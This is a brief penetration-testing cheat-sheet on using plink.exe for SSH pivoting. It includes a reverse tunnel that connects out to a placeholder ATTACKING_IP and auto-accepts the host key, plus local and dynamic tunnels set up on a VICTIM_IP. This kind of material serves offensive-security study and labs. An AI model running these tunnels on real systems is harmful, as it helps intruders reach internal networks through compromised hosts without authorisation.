## It's a windows command line version of the PuTTY SSH client.

### cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

### Convert keys with puttygen: puttygen KEY -o KEY.ppk

## Local SSH Tunneling 

 - plink.exe -L PORT:TARGET_IP:TARGET_PORT USER@VICTIM_IP

### Then browse to: 127.0.0.1:PORT

## Dynamic SSH Tunneling

 - plink.exe -D PORT USER@VICTIM_IP (Execute on target)
